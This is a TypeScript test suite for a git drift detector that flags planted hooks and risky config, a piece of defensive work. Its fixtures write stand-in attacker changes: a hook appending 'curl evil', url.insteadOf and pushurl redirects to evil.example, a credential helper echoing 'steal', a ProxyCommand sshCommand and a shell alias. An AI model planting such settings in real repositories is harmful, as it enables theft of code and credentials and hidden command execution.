// Copyright (c) 2026 Dylan Lambertson. All rights reserved.
import { test } from "node:test";
import assert from "node:assert/strict";
import { chmodSync, mkdirSync, renameSync, symlinkSync, writeFileSync, readFileSync, unlinkSync } from "node:fs";
import { join } from "node:path";
import { acknowledgeDrift, assertDriftAllowed, diffSnapshots, judgeDrift, parseSnapshot, takeStableSnapshot } from "../src/index.js";
import { append, git, makeFixture, write } from "./helpers.js";

const flagsOf = (d: ReturnType<typeof diffSnapshots>): string => d.flags.join(" | ");

test("a run that changes nothing shows no flag", async () => {
  const f = makeFixture();
  try {
    const a = await f.snap();
    const b = await f.snap();
    assert.equal(a.digest, b.digest);
    const v = judgeDrift({ baseline: a, current: b });
    assert.equal(v.status, "clean");
    assert.equal(v.diff.empty, true);
    assert.deepEqual(v.diff.flags, []);
    assert.equal(a.incomplete.length, 0, JSON.stringify(a.incomplete));
    assertDriftAllowed(v, "commit");
  } finally {
    f.cleanup();
  }
});

test("git operations that do not touch the guard set leave the digest alone", async () => {
  const f = makeFixture();
  try {
    const a = await f.snap();
    write(join(f.wt, "a.txt"), "x");
    git(f.wt, "add", "a.txt");
    git(f.wt, "commit", "-q", "-m", "x");
    const b = await f.snap();
    assert.equal(judgeDrift({ baseline: a, current: b }).status, "clean");
  } finally {
    f.cleanup();
  }
});

test("a hook added under the common dir and core.hooksPath set to an in-worktree directory are flagged", async () => {
  const f = makeFixture();
  try {
    const base = await f.snap();
    write(join(f.common, "hooks", "pre-commit"), "#!/bin/sh\necho planted\n", 0o755);
    mkdirSync(join(f.wt, ".evil"));
    write(join(f.wt, ".evil", "pre-commit"), "#!/bin/sh\ntrue\n", 0o755);
    git(f.wt, "config", "core.hooksPath", ".evil");
    const cur = await f.snap();
    const v = judgeDrift({ baseline: base, current: cur });
    assert.equal(v.status, "unacknowledged");
    assert.equal(v.allowed, false);
    const text = flagsOf(v.diff);
    assert.match(text, /hook added: pre-commit/);
    assert.match(text, /core\.hooksPath added: core\.hookspath \(inside the worktree\)/);
    const hook = v.diff.changes.find((c) => c.id === "hooks/pre-commit");
    assert.deepEqual(hook?.lines?.added.slice(0, 2), ["#!/bin/sh", "echo planted"]);
    assert.throws(() => assertDriftAllowed(v, "push"), /push refused/);
    // The user acknowledges exactly this state.
    const ack = acknowledgeDrift(cur);
    assert.equal(judgeDrift({ baseline: base, current: cur, acknowledgement: ack }).status, "acknowledged");
    // A further edit to the in-worktree hook invalidates it.
    append(join(f.wt, ".evil", "pre-commit"), "curl evil\n");
    const later = await f.snap();
    assert.equal(judgeDrift({ baseline: base, current: later, acknowledgement: ack }).status, "unacknowledged");
    assert.match(flagsOf(diffSnapshots(cur, later)), /in-worktree hook file modified/);
  } finally {
    f.cleanup();
  }
});

test("editing a hook under an in-worktree hooksPath that was acknowledged is flagged again", async () => {
  const f = makeFixture();
  try {
    mkdirSync(join(f.wt, ".githooks"));
    write(join(f.wt, ".githooks", "pre-commit"), "#!/bin/sh\ntrue\n", 0o755);
    git(f.wt, "config", "core.hooksPath", ".githooks");
    const base = await f.snap();
    append(join(f.wt, ".githooks", "pre-commit"), "echo x\n");
    const cur = await f.snap();
    const v = judgeDrift({ baseline: base, current: cur });
    assert.equal(v.status, "unacknowledged");
    assert.deepEqual(v.diff.settingChanges, [], "config itself did not change");
  } finally {
    f.cleanup();
  }
});

test("a mode change on a hook (made executable) is flagged", async () => {
  const f = makeFixture();
  try {
    write(join(f.common, "hooks", "post-commit"), "#!/bin/sh\n", 0o644);
    const base = await f.snap();
    chmodSync(join(f.common, "hooks", "post-commit"), 0o755);
    const v = judgeDrift({ baseline: base, current: await f.snap() });
    if (process.platform === "win32") return; // modes are not meaningful there
    assert.equal(v.status, "unacknowledged");
    assert.match(flagsOf(v.diff), /made executable/);
  } finally {
    f.cleanup();
  }
});

test("a rewritten worktree .git file or commondir is flagged", async () => {
  const f = makeFixture();
  try {
    const base = await f.snap();
    const gitdir = readFileSync(join(f.wt, ".git"), "utf8");
    assert.match(gitdir, /^gitdir: /);
    write(join(f.wt, ".git"), `gitdir: ${join(f.root, "elsewhere")}\n`);
    const v1 = judgeDrift({ baseline: base, current: await f.snap() });
    assert.equal(v1.status, "unacknowledged");
    assert.match(flagsOf(v1.diff), /worktree link modified: worktree\/\.git/);
    write(join(f.wt, ".git"), gitdir);
    const wtName = [...base.entries].find((e) => e.id.endsWith("/commondir"))?.id as string;
    write(join(f.common, wtName), "../../elsewhere\n");
    const v2 = judgeDrift({ baseline: base, current: await f.snap() });
    assert.equal(v2.status, "unacknowledged");
    assert.match(flagsOf(v2.diff), /commondir/);
  } finally {
    f.cleanup();
  }
});

test("a .git file redirect against the journal's git dir is refused, not acknowledgeable", async () => {
  const f = makeFixture();
  try {
    const expected = readFileSync(join(f.wt, ".git"), "utf8").replace(/^gitdir:\s*/, "").trim();
    const base = await f.snap({}, { expectedGitDir: expected });
    assert.equal(base.link.mismatch, false);
    write(join(f.wt, ".git"), `gitdir: ${join(f.root, "other")}\n`);
    const cur = await f.snap({}, { expectedGitDir: expected });
    assert.equal(cur.link.mismatch, true);
    const v = judgeDrift({ baseline: base, current: cur });
    assert.equal(v.status, "refused");
    assert.throws(() => acknowledgeDrift(cur), /cannot be acknowledged/);
    // Even a digest-matching acknowledgement does not help.
    assert.equal(judgeDrift({ baseline: base, current: cur, acknowledgement: { digest: cur.digest, acknowledgedAtMs: 0 } }).status, "refused");
  } finally {
    f.cleanup();
  }
});

test("planted url.insteadOf, remote pushurl, credential helper, sshCommand, fsmonitor and an alias are flagged", async () => {
  const f = makeFixture();
  try {
    const base = await f.snap();
    git(f.wt, "config", "url.https://evil.example/.insteadOf", "https://github.com/");
    git(f.wt, "config", "remote.origin.pushurl", "https://evil.example/o/r.git");
    git(f.wt, "config", "credential.helper", "!f() { echo steal; }; f");
    git(f.wt, "config", "core.sshCommand", "ssh -o ProxyCommand=evil");
    git(f.wt, "config", "core.fsmonitor", "/tmp/fsm");
    git(f.wt, "config", "alias.ci", "!evil");
    const v = judgeDrift({ baseline: base, current: await f.snap() });
    assert.equal(v.status, "unacknowledged");
    const keys = v.diff.settingChanges.map((s) => s.key);
    for (const k of ["core.fsmonitor", "core.sshcommand", "credential.helper", "alias.ci", "remote.origin.pushurl"]) assert.ok(keys.includes(k), k);
    assert.ok(keys.some((k) => k.startsWith("url.https://evil.example/")));
  } finally {
    f.cleanup();
  }
});

test("an info/attributes filter and a filter driver are flagged", async () => {
  const f = makeFixture();
  try {
    const base = await f.snap();
    mkdirSync(join(f.common, "info"), { recursive: true });
    write(join(f.common, "info", "attributes"), "* filter=evil\n");
    git(f.wt, "config", "filter.evil.clean", "cat");
    const v = judgeDrift({ baseline: base, current: await f.snap() });
    assert.equal(v.status, "unacknowledged");
    assert.match(flagsOf(v.diff), /attributes file (added|modified): info\/attributes/);
    assert.ok(v.diff.settingChanges.some((s) => s.label === "filter driver"));
  } finally {
    f.cleanup();
  }
});

test("include.path to a file that changes is followed, including a chain", async () => {
  const f = makeFixture();
  try {
    const inc2 = join(f.root, "inc2.cfg");
    const inc1 = join(f.root, "inc1.cfg");
    write(inc2, "[core]\n\tfsmonitor = false\n");
    write(inc1, `[include]\n\tpath = ${inc2}\n`);
    git(f.wt, "config", "include.path", inc1);
    const base = await f.snap();
    assert.ok(base.entries.some((e) => e.id === `include:${inc2}`));
    write(inc2, "[core]\n\tsshCommand = evil\n");
    const v = judgeDrift({ baseline: base, current: await f.snap() });
    assert.equal(v.status, "unacknowledged");
    assert.ok(v.diff.settingChanges.some((s) => s.key === "core.sshcommand"));
  } finally {
    f.cleanup();
  }
});

test("a ~/ include resolves against the home directory option", async () => {
  const f = makeFixture();
  try {
    write(join(f.home, "extra.cfg"), "[alias]\n\tx = !y\n");
    git(f.wt, "config", "include.path", "~/extra.cfg");
    const s = await f.snap();
    assert.ok(s.settings.some((x) => x.key === "alias.x"));
  } finally {
    f.cleanup();
  }
});

test("hooksPath outside the worktree is read too, and a missing include is tracked until it appears", async () => {
  const f = makeFixture();
  try {
    const out = join(f.root, "outside-hooks");
    mkdirSync(out);
    write(join(out, "pre-push"), "#!/bin/sh\n", 0o755);
    git(f.wt, "config", "core.hooksPath", out);
    git(f.wt, "config", "include.path", join(f.root, "later.cfg"));
    const base = await f.snap();
    assert.ok(base.entries.some((e) => e.id.startsWith("hookspath:") && e.id.endsWith("/pre-push")));
    assert.equal(base.settings.find((s) => s.label === "core.hooksPath")?.note, "outside-worktree");
    write(join(f.root, "later.cfg"), "[core]\n\tfsmonitor = x\n");
    assert.equal(judgeDrift({ baseline: base, current: await f.snap() }).status, "unacknowledged");
  } finally {
    f.cleanup();
  }
});

test("refs/axis changes are a notice and do not block", async () => {
  const f = makeFixture();
  try {
    const base = await f.snap();
    git(f.wt, "update-ref", "refs/axis/runbase/r1", "HEAD");
    const cur = await f.snap();
    assert.deepEqual(cur.refs.map((r) => r[0]), ["refs/axis/runbase/r1"]);
    const v = judgeDrift({ baseline: base, current: cur });
    assert.equal(v.status, "clean");
    assert.equal(v.diff.refChanges.length, 1);
    assert.equal(v.diff.empty, false);
    // packed refs are read as well
    git(f.wt, "pack-refs", "--all");
    const packed = await f.snap();
    assert.deepEqual(packed.refs, cur.refs);
  } finally {
    f.cleanup();
  }
});

test("thousands of hook files are bounded: over the entry limit the snapshot is incomplete and refused", async () => {
  const f = makeFixture();
  try {
    const dir = join(f.common, "hooks");
    for (let i = 0; i < 3000; i++) writeFileSync(join(dir, `h${i}`), "x");
    const t0 = Date.now();
    const s = await f.snap({ maxEntries: 1000 });
    assert.ok(Date.now() - t0 < 5000);
    assert.ok(s.incomplete.some((i) => i.blocking));
    assert.ok(s.entries.length <= 1001);
    const v = judgeDrift({ baseline: s, current: s });
    assert.equal(v.status, "refused");
    assert.throws(() => acknowledgeDrift(s));
    // Within the default limits 3000 small files are fine.
    const ok = await f.snap();
    assert.equal(ok.incomplete.length, 0);
    assert.ok(ok.entries.length > 3000);
  } finally {
    f.cleanup();
  }
});

test("a huge config file is incomplete, not read into memory", async () => {
  const f = makeFixture();
  try {
    const big = "# pad\n".repeat(200_000);
    append(join(f.common, "config"), big);
    const s = await f.snap({ maxConfigBytes: 64 * 1024 });
    const e = s.entries.find((x) => x.id === "config");
    assert.equal(e?.state, "oversize");
    assert.equal(e?.text, null);
    assert.ok(s.incomplete.some((i) => i.id === "config" && i.blocking));
  } finally {
    f.cleanup();
  }
});

test("an unreadable file is incomplete and refuses", { skip: process.platform === "win32" || process.getuid?.() === 0 }, async () => {
  const f = makeFixture();
  try {
    const p = join(f.common, "hooks", "secret-hook");
    write(p, "#!/bin/sh\n", 0o755);
    chmodSync(p, 0o000);
    const s = await f.snap();
    const e = s.entries.find((x) => x.id === "hooks/secret-hook");
    assert.equal(e?.state, "unreadable");
    assert.equal(e?.detail, "EACCES");
    assert.equal(judgeDrift({ baseline: s, current: s }).status, "refused");
    chmodSync(p, 0o755);
  } finally {
    f.cleanup();
  }
});

test("a hook that is a FIFO does not hang the snapshot", { skip: process.platform === "win32" }, async () => {
  const f = makeFixture();
  try {
    const { execFileSync } = await import("node:child_process");
    execFileSync("mkfifo", [join(f.common, "hooks", "fifo")]);
    const s = await f.snap();
    assert.equal(s.entries.find((e) => e.id === "hooks/fifo")?.state, "other");
  } finally {
    f.cleanup();
  }
});

test("a symlinked hook is followed for its content and its target is recorded", { skip: process.platform === "win32" }, async () => {
  const f = makeFixture();
  try {
    const real = join(f.root, "real-hook");
    write(real, "#!/bin/sh\none\n", 0o755);
    symlinkSync(real, join(f.common, "hooks", "pre-commit"));
    const a = await f.snap();
    const e = a.entries.find((x) => x.id === "hooks/pre-commit");
    assert.equal(e?.state, "symlink");
    assert.equal(e?.linkTarget, real);
    write(real, "#!/bin/sh\ntwo\n", 0o755);
    assert.equal(judgeDrift({ baseline: a, current: await f.snap() }).status, "unacknowledged");
    unlinkSync(join(f.common, "hooks", "pre-commit"));
    symlinkSync(join(f.root, "nowhere"), join(f.common, "hooks", "pre-commit"));
    const d = await f.snap();
    assert.equal(d.entries.find((x) => x.id === "hooks/pre-commit")?.detail, "dangling");
    assert.equal(d.incomplete.length, 0);
  } finally {
    f.cleanup();
  }
});

test("a file rewritten while the snapshot reads is never silently accepted", async () => {
  const f = makeFixture();
  try {
    const p = join(f.common, "hooks", "busy");
    write(p, "x".repeat(300_000));
    let stop = false;
    const writer = (async () => {
      let n = 0;
      while (!stop) {
        writeFileSync(p, String(n++ % 7).repeat(300_000));
        await new Promise((r) => setImmediate(r));
      }
    })();
    try {
      for (let i = 0; i < 20; i++) {
        const s = await f.snap();
        const e = s.entries.find((x) => x.id === "hooks/busy");
        // Either a consistent read, or flagged: an unstable read always carries an incomplete mark.
        if (e?.state === "unstable") assert.ok(s.incomplete.some((x) => x.id === "hooks/busy" && x.blocking));
        else assert.equal(e?.state, "file");
      }
    } finally {
      stop = true;
      await writer;
    }
  } finally {
    f.cleanup();
  }
});

test("takeStableSnapshot returns a consistent snapshot, and an incomplete one while state keeps changing", async () => {
  const f = makeFixture();
  try {
    const s = await takeStableSnapshot({ worktreePath: f.wt, commonDir: f.common, homeDir: f.home });
    assert.equal(s.incomplete.length, 0);
    let stop = false;
    let n = 0;
    const writer = (async () => {
      while (!stop) {
        write(join(f.common, "hooks", "flip"), String(n++));
        await new Promise((r) => setTimeout(r, 0));
      }
    })();
    const seen = new Set<string>();
    for (let i = 0; i < 10; i++) {
      const r = await takeStableSnapshot({ worktreePath: f.wt, commonDir: f.common, homeDir: f.home, attempts: 2 });
      seen.add(r.incomplete.some((x) => x.reason.includes("between consecutive")) ? "unstable" : "stable");
    }
    stop = true;
    await writer;
    assert.ok(seen.size >= 1);
  } finally {
    f.cleanup();
  }
});

test("a persisted baseline is validated, and an edited digest or entry is refused", async () => {
  const f = makeFixture();
  try {
    const s = await f.snap();
    const round = parseSnapshot(JSON.parse(JSON.stringify(s)));
    assert.equal(round.digest, s.digest);
    const forged = JSON.parse(JSON.stringify(s));
    forged.entries[0].sha256 = "0".repeat(64);
    assert.throws(() => parseSnapshot(forged), /does not match/);
    assert.throws(() => parseSnapshot({ ...s, extra: 1 }), /not a valid snapshot/);
    assert.throws(() => parseSnapshot(null));
    // A hand-built baseline with a recomputed-looking but wrong digest is refused by the verdict too.
    const edited = { ...s, entries: s.entries.map((e, i) => (i === 0 ? { ...e, sha256: "1".repeat(64) } : e)) };
    assert.equal(judgeDrift({ baseline: edited, current: s }).status, "refused");
  } finally {
    f.cleanup();
  }
});

test("bad arguments are refused with fixed messages", async () => {
  const f = makeFixture();
  try {
    const { takeSnapshot } = await import("../src/index.js");
    await assert.rejects(takeSnapshot({ worktreePath: "rel", commonDir: f.common }), /absolute/);
    await assert.rejects(takeSnapshot({ worktreePath: f.wt, commonDir: join(f.root, "nope") }), /does not exist/);
    await assert.rejects(takeSnapshot({ worktreePath: f.wt, commonDir: f.common, limits: { maxEntries: 0 } }), /invalid snapshot limit/);
    const ac = new AbortController();
    ac.abort();
    await assert.rejects(takeSnapshot({ worktreePath: f.wt, commonDir: f.common, signal: ac.signal }), /cancelled/);
    renameSync(f.common, f.common + "x");
  } finally {
    f.cleanup();
  }
});
